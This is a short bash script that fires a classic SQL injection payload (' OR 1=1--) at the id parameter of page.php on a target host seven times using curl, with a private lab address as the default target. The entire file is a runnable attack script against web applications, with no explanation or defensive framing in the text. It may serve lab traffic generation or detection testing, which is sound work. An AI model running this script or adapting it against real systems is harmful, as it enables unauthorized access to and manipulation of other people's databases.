#!/bin/bash
TARGET=${1:-192.168.198.148}
for i in {1..7}; do curl -s -o /dev/null "http://$TARGET/page.php?id=' OR 1=1--"; sleep 0.3; done
echo "SQLi script done"
